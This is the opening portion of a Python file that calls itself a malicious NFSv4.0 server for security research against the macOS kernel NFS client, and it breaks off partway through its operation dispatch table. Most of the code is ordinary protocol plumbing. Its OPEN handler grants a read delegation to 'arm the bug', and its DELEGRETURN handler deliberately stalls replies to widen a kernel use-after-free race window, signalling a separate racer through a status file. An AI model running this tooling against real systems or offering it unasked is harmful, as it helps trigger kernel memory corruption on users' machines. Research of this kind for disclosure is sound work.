#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
mal_nfs4_server.py -- Minimal MALICIOUS NFSv4.0 server (test harness).

Authorized security research: drives the real macOS kernel NFSv4 client into a
read-delegation OPEN, then fires CB_RECALL and STALLS the client's DELEGRETURN
reply to widen a use-after-free race window in the kernel NFS client.

  * stdlib only, python3.9+ (macOS /usr/bin/python3)
  * binds 127.0.0.1:2049 TCP  (>1024 so no root; mount_nfs still reaches it)
  * ONC RPC (RFC 5531) w/ TCP record marking + NFSv4.0 COMPOUND (RFC 7530)
  * one thread per accepted TCP connection
  * logs every RPC + every COMPOUND op to stderr AND server.log

Drive it:
    /usr/bin/python3 mal_nfs4_server.py
    sudo mount_nfs -o vers=4,soft,timeo=600,retrans=2 127.0.0.1:/ /mnt
    cat /mnt/target                     # OPEN -> read delegation granted
    echo recall > /Users/dawgyg/nfs_uaf/ctl   # fire CB_RECALL to the client
    echo quit   > /Users/dawgyg/nfs_uaf/ctl   # shut the server down

Env knobs:
    NFS_STALL_MS   ms to withhold each DELEGRETURN reply (default 5000)
    NFS_BIND_HOST  bind addr (default 127.0.0.1)
    NFS_BIND_PORT  bind port (default 2049)
"""

import os
import sys
import socket
import struct
import threading
import traceback
import time
import random

# ----------------------------------------------------------------------------
# Paths / config
# ----------------------------------------------------------------------------
BASE_DIR = "/Users/dawgyg/nfs_uaf"
LOG_PATH = os.path.join(BASE_DIR, "server.log")
CTL_PATH = os.path.join(BASE_DIR, "ctl")

BIND_HOST = os.environ.get("NFS_BIND_HOST", "127.0.0.1")
BIND_PORT = int(os.environ.get("NFS_BIND_PORT", "2049"))
STALL_MS = int(os.environ.get("NFS_STALL_MS", "5000"))

# ----------------------------------------------------------------------------
# Logging (thread-safe, dual sink)
# ----------------------------------------------------------------------------
_log_lock = threading.Lock()
try:
    _log_fh = open(LOG_PATH, "a", buffering=1)
except Exception:
    _log_fh = None


def log(msg):
    line = "[%0.3f][%s] %s" % (time.time(), threading.current_thread().name, msg)
    with _log_lock:
        sys.stderr.write(line + "\n")
        sys.stderr.flush()
        if _log_fh:
            _log_fh.write(line + "\n")


def hexb(b, limit=64):
    b = bytes(b)
    s = b[:limit].hex()
    return s + ("..." if len(b) > limit else "")


# ----------------------------------------------------------------------------
# RPC constants (RFC 5531)
# ----------------------------------------------------------------------------
CALL = 0
REPLY = 1
MSG_ACCEPTED = 0
MSG_DENIED = 1
SUCCESS = 0
PROG_UNAVAIL = 1
PROG_MISMATCH = 2
PROC_UNAVAIL = 3
GARBAGE_ARGS = 4

AUTH_NONE = 0
AUTH_SYS = 1

NFS_PROG = 100003
NFS_VERS = 4
NFSPROC4_NULL = 0
NFSPROC4_COMPOUND = 1

# ----------------------------------------------------------------------------
# NFSv4 error codes (RFC 7530)
# ----------------------------------------------------------------------------
NFS4_OK = 0
NFS4ERR_PERM = 1
NFS4ERR_NOENT = 2
NFS4ERR_IO = 5
NFS4ERR_ACCESS = 13
NFS4ERR_EXIST = 17
NFS4ERR_NOTDIR = 20
NFS4ERR_ISDIR = 21
NFS4ERR_INVAL = 22
NFS4ERR_FBIG = 27
NFS4ERR_NOTSUPP = 10004
NFS4ERR_SERVERFAULT = 10006
NFS4ERR_BADHANDLE = 10001
NFS4ERR_STALE = 70
NFS4ERR_BADXDR = 10036
NFS4ERR_NOFILEHANDLE = 10020

# ----------------------------------------------------------------------------
# NFSv4 op numbers (RFC 7530)
# ----------------------------------------------------------------------------
OP_ACCESS = 3
OP_CLOSE = 4
OP_COMMIT = 5
OP_CREATE = 6
OP_DELEGPURGE = 7
OP_DELEGRETURN = 8
OP_GETATTR = 9
OP_GETFH = 10
OP_LINK = 11
OP_LOCK = 12
OP_LOCKT = 13
OP_LOCKU = 14
OP_LOOKUP = 15
OP_LOOKUPP = 16
OP_NVERIFY = 17
OP_OPEN = 18
OP_OPENATTR = 19
OP_OPEN_CONFIRM = 20
OP_OPEN_DOWNGRADE = 21
OP_PUTFH = 22
OP_PUTPUBFH = 23
OP_PUTROOTFH = 24
OP_READ = 25
OP_READDIR = 26
OP_READLINK = 27
OP_REMOVE = 28
OP_RENAME = 29
OP_RENEW = 30
OP_RESTOREFH = 31
OP_SAVEFH = 32
OP_SECINFO = 33
OP_SETATTR = 34
OP_SETCLIENTID = 35
OP_SETCLIENTID_CONFIRM = 36
OP_VERIFY = 37
OP_WRITE = 38
OP_RELEASE_LOCKOWNER = 39
OP_ILLEGAL = 10044

OPNAME = {
    3: "ACCESS", 4: "CLOSE", 5: "COMMIT", 6: "CREATE", 7: "DELEGPURGE",
    8: "DELEGRETURN", 9: "GETATTR", 10: "GETFH", 11: "LINK", 12: "LOCK",
    13: "LOCKT", 14: "LOCKU", 15: "LOOKUP", 16: "LOOKUPP", 17: "NVERIFY",
    18: "OPEN", 19: "OPENATTR", 20: "OPEN_CONFIRM", 21: "OPEN_DOWNGRADE",
    22: "PUTFH", 23: "PUTPUBFH", 24: "PUTROOTFH", 25: "READ", 26: "READDIR",
    27: "READLINK", 28: "REMOVE", 29: "RENAME", 30: "RENEW", 31: "RESTOREFH",
    32: "SAVEFH", 33: "SECINFO", 34: "SETATTR", 35: "SETCLIENTID",
    36: "SETCLIENTID_CONFIRM", 37: "VERIFY", 38: "WRITE",
    39: "RELEASE_LOCKOWNER", 10044: "ILLEGAL",
}

# Callback op numbers (RFC 7530 sec 20)
OP_CB_GETATTR = 3
OP_CB_RECALL = 4
CB_COMPOUND = 1

# ----------------------------------------------------------------------------
# nfs_ftype4
# ----------------------------------------------------------------------------
NF4REG = 1
NF4DIR = 2

# open share
OPEN4_SHARE_ACCESS_READ = 1
OPEN4_NOCREATE = 0
OPEN4_CREATE = 1

# claim types
CLAIM_NULL = 0
CLAIM_PREVIOUS = 1
CLAIM_DELEGATE_CUR = 2
CLAIM_DELEGATE_PREV = 3

# open result flags
OPEN4_RESULT_CONFIRM = 0x00000002
OPEN4_RESULT_LOCKTYPE_POSIX = 0x00000004

# delegation types
OPEN_DELEGATE_NONE = 0
OPEN_DELEGATE_READ = 1
OPEN_DELEGATE_WRITE = 2

# ace
ACE4_ACCESS_ALLOWED_ACE_TYPE = 0
ACE4_GENERIC_READ = 0x00120081

# ACCESS mask bits
ACCESS4_READ = 0x01
ACCESS4_LOOKUP = 0x02
ACCESS4_MODIFY = 0x04
ACCESS4_EXTEND = 0x08
ACCESS4_DELETE = 0x10
ACCESS4_EXECUTE = 0x20

# FATTR4 attribute numbers
FA_SUPPORTED_ATTRS = 0
FA_TYPE = 1
FA_FH_EXPIRE_TYPE = 2
FA_CHANGE = 3
FA_SIZE = 4
FA_LINK_SUPPORT = 5
FA_SYMLINK_SUPPORT = 6
FA_NAMED_ATTR = 7
FA_FSID = 8
FA_UNIQUE_HANDLES = 9
FA_LEASE_TIME = 10
FA_RDATTR_ERROR = 11
FA_ACL = 12
FA_ACLSUPPORT = 13
FA_ARCHIVE = 14
FA_CANSETTIME = 15
FA_CASE_INSENSITIVE = 16
FA_CASE_PRESERVING = 17
FA_CHOWN_RESTRICTED = 18
FA_FILEHANDLE = 19
FA_FILEID = 20
FA_FILES_AVAIL = 21
FA_FILES_FREE = 22
FA_FILES_TOTAL = 23
FA_FS_LOCATIONS = 24
FA_HIDDEN = 25
FA_HOMOGENEOUS = 26
FA_MAXFILESIZE = 27
FA_MAXLINK = 28
FA_MAXNAME = 29
FA_MAXREAD = 30
FA_MAXWRITE = 31
FA_MIMETYPE = 32
FA_MODE = 33
FA_NO_TRUNC = 34
FA_NUMLINKS = 35
FA_OWNER = 36
FA_OWNER_GROUP = 37
FA_QUOTA_AVAIL_HARD = 38
FA_QUOTA_AVAIL_SOFT = 39
FA_QUOTA_USED = 40
FA_RAWDEV = 41
FA_SPACE_AVAIL = 42
FA_SPACE_FREE = 43
FA_SPACE_TOTAL = 44
FA_SPACE_USED = 45
FA_SYSTEM = 46
FA_TIME_ACCESS = 47
FA_TIME_BACKUP = 48
FA_TIME_CREATE = 49
FA_TIME_DELTA = 50
FA_TIME_METADATA = 52
FA_TIME_MODIFY = 53
FA_MOUNTED_ON_FILEID = 55

# The set of attributes we can encode.
SUPPORTED_ATTRS = frozenset([
    FA_SUPPORTED_ATTRS, FA_TYPE, FA_FH_EXPIRE_TYPE, FA_CHANGE, FA_SIZE,
    FA_LINK_SUPPORT, FA_SYMLINK_SUPPORT, FA_NAMED_ATTR, FA_FSID,
    FA_UNIQUE_HANDLES, FA_LEASE_TIME, FA_RDATTR_ERROR, FA_ACLSUPPORT,
    FA_CANSETTIME, FA_CASE_INSENSITIVE, FA_CASE_PRESERVING,
    FA_CHOWN_RESTRICTED, FA_FILEHANDLE, FA_FILEID, FA_FILES_AVAIL,
    FA_FILES_FREE, FA_FILES_TOTAL, FA_HOMOGENEOUS, FA_MAXFILESIZE,
    FA_MAXLINK, FA_MAXNAME, FA_MAXREAD, FA_MAXWRITE, FA_MODE, FA_NO_TRUNC,
    FA_NUMLINKS, FA_OWNER, FA_OWNER_GROUP, FA_RAWDEV, FA_SPACE_AVAIL,
    FA_SPACE_FREE, FA_SPACE_TOTAL, FA_SPACE_USED, FA_TIME_ACCESS,
    FA_TIME_DELTA, FA_TIME_METADATA, FA_TIME_MODIFY, FA_MOUNTED_ON_FILEID,
])

LEASE_TIME = 90
MAXREAD = 65536
MAXWRITE = 65536

# ----------------------------------------------------------------------------
# XDR reader / writer
# ----------------------------------------------------------------------------
class XDRError(Exception):
    pass


class XDRReader(object):
    __slots__ = ("buf", "off")

    def __init__(self, buf):
        self.buf = buf
        self.off = 0

    def _take(self, n):
        if self.off + n > len(self.buf):
            raise XDRError("short read: need %d have %d @ %d" %
                           (n, len(self.buf) - self.off, self.off))
        b = self.buf[self.off:self.off + n]
        self.off += n
        return b

    def u32(self):
        return struct.unpack(">I", self._take(4))[0]

    def i32(self):
        return struct.unpack(">i", self._take(4))[0]

    def u64(self):
        return struct.unpack(">Q", self._take(8))[0]

    def i64(self):
        return struct.unpack(">q", self._take(8))[0]

    def boolean(self):
        return self.u32() != 0

    def opaque(self):
        n = self.u32()
        b = self._take(n)
        pad = (4 - (n & 3)) & 3
        if pad:
            self._take(pad)
        return b

    def fopaque(self, n):
        # fixed-length opaque, padded to 4
        b = self._take(n)
        pad = (4 - (n & 3)) & 3
        if pad:
            self._take(pad)
        return b

    def string(self):
        return self.opaque()

    def bitmap(self):
        cnt = self.u32()
        words = [self.u32() for _ in range(cnt)]
        return words

    def remaining(self):
        return len(self.buf) - self.off


class XDRWriter(object):
    __slots__ = ("out",)

    def __init__(self):
        self.out = bytearray()

    def u32(self, v):
        self.out += struct.pack(">I", v & 0xFFFFFFFF)

    def i32(self, v):
        self.out += struct.pack(">i", v)

    def u64(self, v):
        self.out += struct.pack(">Q", v & 0xFFFFFFFFFFFFFFFF)

    def i64(self, v):
        self.out += struct.pack(">q", v)

    def boolean(self, v):
        self.u32(1 if v else 0)

    def opaque(self, b):
        b = bytes(b)
        self.u32(len(b))
        self.out += b
        pad = (4 - (len(b) & 3)) & 3
        if pad:
            self.out += b"\x00" * pad

    def fopaque(self, b):
        b = bytes(b)
        self.out += b
        pad = (4 - (len(b) & 3)) & 3
        if pad:
            self.out += b"\x00" * pad

    def string(self, s):
        if isinstance(s, str):
            s = s.encode("utf-8")
        self.opaque(s)

    def bitmap(self, attr_nums):
        if not attr_nums:
            self.u32(0)
            return
        maxbit = max(attr_nums)
        nwords = (maxbit // 32) + 1
        words = [0] * nwords
        for a in attr_nums:
            words[a // 32] |= (1 << (a % 32))
        self.u32(nwords)
        for w in words:
            self.u32(w)

    def bytes(self):
        return bytes(self.out)


# ----------------------------------------------------------------------------
# In-memory filesystem model
# ----------------------------------------------------------------------------
ROOT_FH = b"\x01" * 8
TARGET_FH = b"\x02" * 8
OPEN_STATE_OTHER = b"\x03" * 12
DELEG_STATE_OTHER = b"\x04" * 12

TARGET_SIZE = 4096
TARGET_CONTENT = b"\x00" * TARGET_SIZE

CLIENTID = 0x1122334455667788
SC_CONFIRM = b"\xAA\xBB\xCC\xDD\xEE\xFF\x00\x11"

FSID_MAJOR = 0x1234
FSID_MINOR = 0x5678

NOW = int(time.time())


class FileObj(object):
    def __init__(self, fh, fileid, ftype, size, mode, name):
        self.fh = fh
        self.fileid = fileid
        self.ftype = ftype
        self.size = size
        self.mode = mode
        self.name = name


ROOT = FileObj(ROOT_FH, 1, NF4DIR, 512, 0o40755, "/")
TARGET = FileObj(TARGET_FH, 2, NF4REG, TARGET_SIZE, 0o100644, "target")
FH_TABLE = {ROOT_FH: ROOT, TARGET_FH: TARGET}


# ----------------------------------------------------------------------------
# FATTR4 encoding
# ----------------------------------------------------------------------------
def encode_one_attr(w, attr, fo):
    """Append the XDR value for a single supported attribute. Return True if
    encoded, False if unsupported (caller must not set its bit)."""
    if attr == FA_SUPPORTED_ATTRS:
        w.bitmap(SUPPORTED_ATTRS)
    elif attr == FA_TYPE:
        w.u32(fo.ftype)
    elif attr == FA_FH_EXPIRE_TYPE:
        w.u32(0)  # FH4_PERSISTENT
    elif attr == FA_CHANGE:
        w.u64(NOW)
    elif attr == FA_SIZE:
        w.u64(fo.size)
    elif attr == FA_LINK_SUPPORT:
        w.boolean(False)
    elif attr == FA_SYMLINK_SUPPORT:
        w.boolean(False)
    elif attr == FA_NAMED_ATTR:
        w.boolean(False)
    elif attr == FA_FSID:
        w.u64(FSID_MAJOR)
        w.u64(FSID_MINOR)
    elif attr == FA_UNIQUE_HANDLES:
        w.boolean(True)
    elif attr == FA_LEASE_TIME:
        w.u32(LEASE_TIME)
    elif attr == FA_RDATTR_ERROR:
        w.u32(NFS4_OK)
    elif attr == FA_ACLSUPPORT:
        w.u32(0)
    elif attr == FA_CANSETTIME:
        w.boolean(True)
    elif attr == FA_CASE_INSENSITIVE:
        w.boolean(False)
    elif attr == FA_CASE_PRESERVING:
        w.boolean(True)
    elif attr == FA_CHOWN_RESTRICTED:
        w.boolean(True)
    elif attr == FA_FILEHANDLE:
        w.opaque(fo.fh)
    elif attr == FA_FILEID:
        w.u64(fo.fileid)
    elif attr == FA_FILES_AVAIL:
        w.u64(1000000)
    elif attr == FA_FILES_FREE:
        w.u64(1000000)
    elif attr == FA_FILES_TOTAL:
        w.u64(1000000)
    elif attr == FA_HOMOGENEOUS:
        w.boolean(True)
    elif attr == FA_MAXFILESIZE:
        w.u64(0x7FFFFFFFFFFFFFFF)
    elif attr == FA_MAXLINK:
        w.u32(32000)
    elif attr == FA_MAXNAME:
        w.u32(255)
    elif attr == FA_MAXREAD:
        w.u64(MAXREAD)
    elif attr == FA_MAXWRITE:
        w.u64(MAXWRITE)
    elif attr == FA_MODE:
        w.u32(fo.mode & 0o7777)
    elif attr == FA_NO_TRUNC:
        w.boolean(True)
    elif attr == FA_NUMLINKS:
        w.u32(1)
    elif attr == FA_OWNER:
        w.string("501")
    elif attr == FA_OWNER_GROUP:
        w.string("20")
    elif attr == FA_RAWDEV:
        w.u32(0)
        w.u32(0)
    elif attr == FA_SPACE_AVAIL:
        w.u64(1 << 40)
    elif attr == FA_SPACE_FREE:
        w.u64(1 << 40)
    elif attr == FA_SPACE_TOTAL:
        w.u64(1 << 42)
    elif attr == FA_SPACE_USED:
        w.u64(fo.size)
    elif attr == FA_TIME_ACCESS:
        w.i64(NOW)
        w.u32(0)
    elif attr == FA_TIME_DELTA:
        w.i64(1)
        w.u32(0)
    elif attr == FA_TIME_METADATA:
        w.i64(NOW)
        w.u32(0)
    elif attr == FA_TIME_MODIFY:
        w.i64(NOW)
        w.u32(0)
    elif attr == FA_MOUNTED_ON_FILEID:
        w.u64(fo.fileid)
    else:
        return False
    return True


def encode_fattr4(requested_words, fo):
    """Build a fattr4 (bitmap4 + opaque attrlist) for file fo answering the
    requested attribute bitmap. Returns bytes to be appended raw."""
    # Determine requested attr numbers.
    requested = []
    for widx, word in enumerate(requested_words):
        for bit in range(32):
            if word & (1 << bit):
                requested.append(widx * 32 + bit)

    got = []
    valw = XDRWriter()
    for a in requested:
        if a in SUPPORTED_ATTRS:
            tmp = XDRWriter()
            if encode_one_attr(tmp, a, fo):
                got.append(a)
                valw.out += tmp.out
        else:
            log("  [fattr4] requested UNSUPPORTED attr #%d (skipped)" % a)

    out = XDRWriter()
    out.bitmap(got)
    out.opaque(valw.bytes())
    return out.bytes()


# ----------------------------------------------------------------------------
# TCP record marking
# ----------------------------------------------------------------------------
def recv_exact(sock, n):
    chunks = []
    got = 0
    while got < n:
        c = sock.recv(n - got)
        if not c:
            return None
        chunks.append(c)
        got += len(c)
    return b"".join(chunks)


def recv_record(sock):
    """Read one full RPC message across TCP record-marking fragments."""
    frags = []
    while True:
        hdr = recv_exact(sock, 4)
        if hdr is None:
            return None
        marker = struct.unpack(">I", hdr)[0]
        last = (marker & 0x80000000) != 0
        length = marker & 0x7FFFFFFF
        body = recv_exact(sock, length) if length else b""
        if body is None:
            return None
        frags.append(body)
        if last:
            break
    return b"".join(frags)


def send_record(sock, payload):
    marker = 0x80000000 | (len(payload) & 0x7FFFFFFF)
    sock.sendall(struct.pack(">I", marker) + payload)


# ----------------------------------------------------------------------------
# Global server state
# ----------------------------------------------------------------------------
class ServerState(object):
    def __init__(self):
        self.lock = threading.Lock()
        self.cb_program = None
        self.cb_ip = None
        self.cb_port = None
        self.cb_ident = 0
        self.confirmed = False
        self.open_seqid = 1
        self.deleg_seqid = 1
        self.deleg_granted = False

    def snapshot_cb(self):
        with self.lock:
            return (self.cb_program, self.cb_ip, self.cb_port, self.cb_ident)


STATE = ServerState()


# ----------------------------------------------------------------------------
# COMPOUND op handlers -- each takes (ctx, r:XDRReader, w:XDRWriter) and returns
# an NFS4 status. They read args from r and append results to w. w already has
# the opnum written; the dispatcher writes status after the handler by using a
# placeholder pattern (we handle status inline, see process_compound).
# ----------------------------------------------------------------------------
class CompoundCtx(object):
    def __init__(self, peer):
        self.peer = peer
        self.cur_fh = None
        self.saved_fh = None


class Handlers(object):
    # Each handler: (status, ) and writes result body into w (AFTER status).
    # Signature: def op_X(self, ctx, r, w) -> status:int
    #   * must fully consume its args from r
    #   * on non-OK status, write NOTHING (RFC: only opnum+status on error)

    def op_PUTROOTFH(self, ctx, r, w):
        ctx.cur_fh = ROOT_FH
        return NFS4_OK

    def op_PUTFH(self, ctx, r, w):
        fh = r.opaque()
        if fh not in FH_TABLE:
            log("  PUTFH unknown fh=%s" % hexb(fh))
            return NFS4ERR_BADHANDLE
        ctx.cur_fh = fh
        return NFS4_OK

    def op_PUTPUBFH(self, ctx, r, w):
        ctx.cur_fh = ROOT_FH
        return NFS4_OK

    def op_GETFH(self, ctx, r, w):
        if ctx.cur_fh is None:
            return NFS4ERR_NOFILEHANDLE
        w.opaque(ctx.cur_fh)
        return NFS4_OK

    def op_SAVEFH(self, ctx, r, w):
        if ctx.cur_fh is None:
            return NFS4ERR_NOFILEHANDLE
        ctx.saved_fh = ctx.cur_fh
        return NFS4_OK

    def op_RESTOREFH(self, ctx, r, w):
        if ctx.saved_fh is None:
            return NFS4ERR_NOFILEHANDLE
        ctx.cur_fh = ctx.saved_fh
        return NFS4_OK

    def op_LOOKUPP(self, ctx, r, w):
        ctx.cur_fh = ROOT_FH
        return NFS4_OK

    def op_GETATTR(self, ctx, r, w):
        req = r.bitmap()
        fo = FH_TABLE.get(ctx.cur_fh)
        if fo is None:
            return NFS4ERR_NOFILEHANDLE
        log("  GETATTR fh=%s req_bitmap=%s" % (hexb(ctx.cur_fh), req))
        w.out += encode_fattr4(req, fo)
        return NFS4_OK

    def op_LOOKUP(self, ctx, r, w):
        name = r.string()
        log("  LOOKUP name=%r" % name)
        if ctx.cur_fh != ROOT_FH:
            return NFS4ERR_NOTDIR
        if name == b"target":
            ctx.cur_fh = TARGET_FH
            return NFS4_OK
        return NFS4ERR_NOENT

    def op_ACCESS(self, ctx, r, w):
        want = r.u32()
        fo = FH_TABLE.get(ctx.cur_fh)
        if fo is None:
            return NFS4ERR_NOFILEHANDLE
        supported = (ACCESS4_READ | ACCESS4_LOOKUP | ACCESS4_EXECUTE)
        granted = want & supported
        log("  ACCESS want=0x%x granted=0x%x" % (want, granted))
        w.u32(supported)
        w.u32(granted)
        return NFS4_OK

    def op_SETCLIENTID(self, ctx, r, w):
        verifier = r.fopaque(8)
        clid = r.opaque()
        cb_program = r.u32()
        r_netid = r.string()
        r_addr = r.string()
        cb_ident = r.u32()
        # Parse r_addr "h1.h2.h3.h4.p1.p2"
        ip = None
        port = None
        try:
            parts = r_addr.decode().split(".")
            if len(parts) >= 6:
                ip = ".".join(parts[0:4])
                p1 = int(parts[4])
                p2 = int(parts[5])
                port = (p1 << 8) | p2
        except Exception as e:
            log("  SETCLIENTID r_addr parse fail: %s" % e)
        log("  SETCLIENTID verifier=%s id=%r cb_prog=%d netid=%r addr=%r "
            "-> cb_ip=%s cb_port=%s ident=%d"
            % (hexb(verifier), clid, cb_program, r_netid, r_addr, ip, port,
               cb_ident))
        with STATE.lock:
            STATE.cb_program = cb_program
            STATE.cb_ip = ip
            STATE.cb_port = port
            STATE.cb_ident = cb_ident
            STATE.confirmed = False
        w.u64(CLIENTID)
        w.fopaque(SC_CONFIRM)
        return NFS4_OK

    def op_SETCLIENTID_CONFIRM(self, ctx, r, w):
        clid = r.u64()
        conf = r.fopaque(8)
        log("  SETCLIENTID_CONFIRM clientid=0x%x confirm=%s"
            % (clid, hexb(conf)))
        with STATE.lock:
            STATE.confirmed = True
        return NFS4_OK

    def op_RENEW(self, ctx, r, w):
        clid = r.u64()
        log("  RENEW clientid=0x%x" % clid)
        return NFS4_OK

    def _parse_open_claim(self, r):
        claim = r.u32()
        info = {"claim": claim}
        if claim == CLAIM_NULL:
            info["name"] = r.string()
        elif claim == CLAIM_PREVIOUS:
            info["delegate_type"] = r.u32()
        elif claim == CLAIM_DELEGATE_CUR:
            info["deleg_stateid"] = (r.u32(), r.fopaque(12))
            info["name"] = r.string()
        elif claim == CLAIM_DELEGATE_PREV:
            info["name"] = r.string()
        return info

    def op_OPEN(self, ctx, r, w):
        seqid = r.u32()
        share_access = r.u32()
        share_deny = r.u32()
        # open_owner4
        oo_clientid = r.u64()
        oo_owner = r.opaque()
        # openhow
        opentype = r.u32()
        if opentype == OPEN4_CREATE:
            createmode = r.u32()
            if createmode in (0, 1):  # UNCHECKED4 / GUARDED4
                cattr_bitmap = r.bitmap()
                cattr_vals = r.opaque()
            elif createmode == 2:  # EXCLUSIVE4
                r.fopaque(8)
        claim = self._parse_open_claim(r)
        log("  OPEN seqid=%d share_access=0x%x share_deny=0x%x owner=%r "
            "opentype=%d claim=%s"
            % (seqid, share_access, share_deny, oo_owner, opentype, claim))

        # Resolve which file: CLAIM_NULL uses a name under current (root) FH.
        name = claim.get("name")
        if claim["claim"] == CLAIM_NULL:
            if name != b"target":
                return NFS4ERR_NOENT
            ctx.cur_fh = TARGET_FH
        else:
            # CLAIM_PREVIOUS / DELEGATE_* -> operate on current fh
            if ctx.cur_fh != TARGET_FH:
                # allow it anyway if it's the target
                ctx.cur_fh = TARGET_FH

        with STATE.lock:
            STATE.open_seqid = 1
            STATE.deleg_seqid = 1
            STATE.deleg_granted = True
            open_seq = STATE.open_seqid
            deleg_seq = STATE.deleg_seqid

        # --- OPEN resok4 ---
        # stateid4
        w.u32(open_seq)
        w.fopaque(OPEN_STATE_OTHER)
        # change_info4 { atomic, before, after }
        w.boolean(True)
        w.u64(NOW)
        w.u64(NOW)
        # rflags -> ask client to CONFIRM
        w.u32(OPEN4_RESULT_CONFIRM | OPEN4_RESULT_LOCKTYPE_POSIX)
        # attrset (which attrs were set by this open) -- empty
        w.bitmap([])
        # delegation: open_delegation4, READ delegation -- ARMS THE BUG
        w.u32(OPEN_DELEGATE_READ)
        #   open_read_delegation4 { stateid, recall, permissions:nfsace4 }
        w.u32(deleg_seq)
        w.fopaque(DELEG_STATE_OTHER)
        w.boolean(False)  # recall = FALSE
        #   nfsace4 { type, flag, mask, who }
        w.u32(ACE4_ACCESS_ALLOWED_ACE_TYPE)
        w.u32(0)
        w.u32(ACE4_GENERIC_READ)
        w.string("EVERYONE@")
        log("  OPEN -> GRANTED READ delegation (deleg stateid other=%s seq=%d)"
            % (hexb(DELEG_STATE_OTHER), deleg_seq))
        return NFS4_OK

    def op_OPEN_CONFIRM(self, ctx, r, w):
        seqid_stateid_seq = r.u32()
        stateid_other = r.fopaque(12)
        seqid = r.u32()
        with STATE.lock:
            STATE.open_seqid += 1
            new_seq = STATE.open_seqid
        log("  OPEN_CONFIRM stateid(seq=%d other=%s) seqid=%d -> new_seq=%d"
            % (seqid_stateid_seq, hexb(stateid_other), seqid, new_seq))
        w.u32(new_seq)
        w.fopaque(OPEN_STATE_OTHER)
        return NFS4_OK

    def op_OPEN_DOWNGRADE(self, ctx, r, w):
        st_seq = r.u32()
        st_other = r.fopaque(12)
        seqid = r.u32()
        share_access = r.u32()
        share_deny = r.u32()
        with STATE.lock:
            STATE.open_seqid += 1
            new_seq = STATE.open_seqid
        log("  OPEN_DOWNGRADE seqid=%d access=0x%x deny=0x%x -> new_seq=%d"
            % (seqid, share_access, share_deny, new_seq))
        w.u32(new_seq)
        w.fopaque(OPEN_STATE_OTHER)
        return NFS4_OK

    def op_CLOSE(self, ctx, r, w):
        seqid = r.u32()
        st_seq = r.u32()
        st_other = r.fopaque(12)
        with STATE.lock:
            STATE.open_seqid += 1
            new_seq = STATE.open_seqid
        log("  CLOSE seqid=%d stateid(seq=%d other=%s) -> new_seq=%d"
            % (seqid, st_seq, hexb(st_other), new_seq))
        w.u32(new_seq)
        w.fopaque(OPEN_STATE_OTHER)
        return NFS4_OK

    def op_READ(self, ctx, r, w):
        st_seq = r.u32()
        st_other = r.fopaque(12)
        offset = r.u64()
        count = r.u32()
        fo = FH_TABLE.get(ctx.cur_fh)
        if fo is None:
            return NFS4ERR_NOFILEHANDLE
        if offset >= fo.size:
            data = b""
            eof = True
        else:
            end = min(offset + count, fo.size)
            data = TARGET_CONTENT[offset:end]
            eof = end >= fo.size
        log("  READ off=%d count=%d -> %d bytes eof=%s (stateid seq=%d other=%s)"
            % (offset, count, len(data), eof, st_seq, hexb(st_other)))
        w.boolean(eof)
        w.opaque(data)
        return NFS4_OK

    def op_WRITE(self, ctx, r, w):
        st_seq = r.u32()
        st_other = r.fopaque(12)
        offset = r.u64()
        stable = r.u32()
        data = r.opaque()
        log("  WRITE off=%d stable=%d len=%d" % (offset, stable, len(data)))
        # write_resok4 { count, committed, writeverf }
        w.u32(len(data))
        w.u32(2)  # FILE_SYNC4
        w.fopaque(SC_CONFIRM)
        return NFS4_OK

    def op_COMMIT(self, ctx, r, w):
        offset = r.u64()
        count = r.u32()
        log("  COMMIT off=%d count=%d" % (offset, count))
        w.fopaque(SC_CONFIRM)  # writeverf4
        return NFS4_OK

    def op_READDIR(self, ctx, r, w):
        cookie = r.u64()
        cookieverf = r.fopaque(8)
        dircount = r.u32()
        maxcount = r.u32()
        req = r.bitmap()
        log("  READDIR cookie=%d dircount=%d maxcount=%d req=%s"
            % (cookie, dircount, maxcount, req))
        if ctx.cur_fh != ROOT_FH:
            return NFS4ERR_NOTDIR
        # cookieverf4
        w.fopaque(b"\x00" * 8)
        entries = []
        if cookie == 0:
            entries = [
                (3, "target", TARGET),
            ]
        # dirlist4: for each entry -> bool(true) cookie name fattr4 ; end bool(false); eof bool
        for (ck, nm, fo) in entries:
            w.boolean(True)         # value follows
            w.u64(ck)               # cookie
            w.string(nm)            # name
            w.out += encode_fattr4(req, fo)  # attrs
        w.boolean(False)            # no more entries
        w.boolean(True)             # eof
        return NFS4_OK

    def op_SECINFO(self, ctx, r, w):
        name = r.string()
        log("  SECINFO name=%r" % name)
        # SECINFO4resok = array<secinfo4>. Offer AUTH_SYS(1) and AUTH_NONE(0).
        w.u32(2)
        w.u32(AUTH_SYS)
        w.u32(AUTH_NONE)
        return NFS4_OK

    def op_DELEGRETURN(self, ctx, r, w):
        st_seq = r.u32()
        st_other = r.fopaque(12)
        log("  *** DELEGRETURN received *** stateid(seq=%d other=%s) -- "
            "STALLING reply %d ms to widen race window"
            % (st_seq, hexb(st_other), STALL_MS))
        with STATE.lock:
            STATE.deleg_granted = False
        # Signal the racer that the kernel sock thread is now parked in
        # nfs4_delegation_return holding the raw np -> fire reclaim NOW.
        try:
            with open(os.path.join(BASE_DIR, "stall_status"), "w") as f:
                f.write("stalling\n"); f.flush()
        except Exception:
            pass
        # Stall in THIS connection's own thread; other connections unaffected.
        time.sleep(STALL_MS / 1000.0)
        try:
            with open(os.path.join(BASE_DIR, "stall_status"), "w") as f:
                f.write("idle\n"); f.flush()
        except Exception:
            pass
        log("  *** DELEGRETURN stall complete -- sending reply ***")
        return NFS4_OK

    def op_NVERIFY(self, ctx, r, w):
        req = r.bitmap()
        vals = r.opaque()
        log("  NVERIFY bitmap=%s (returning NFS4_OK = attrs differ)" % req)
        # NVERIFY succeeds (OK) when attrs DIFFER. Say they differ.
        return NFS4_OK

    def op_VERIFY(self, ctx, r, w):
        req = r.bitmap()
        vals = r.opaque()
        log("  VERIFY bitmap=%s (returning NFS4_OK = attrs match)" % req)
        # VERIFY succeeds (OK) when attrs MATCH. Say they match.
        return NFS4_OK


HANDLERS = Handlers()
OP_DISPATCH = {
    OP_PUTROOTFH: HANDLERS.op_PUTROOTFH,
    OP_PUTFH: HANDLERS.op_PUTFH,
    OP_PUTPUBFH: HANDLERS.op_PUTPUBFH,
    OP_GETFH: HANDLERS.op_GETFH,
    OP_SAVEFH: HANDLERS.op_SAVEFH,
    OP_RESTOREFH: HANDLERS.op_RESTOREFH,
    OP_LOOKUP: HANDLERS.op_LOOKUP,
    OP_LOOKUPP: HANDLERS.op_LOOKUPP,
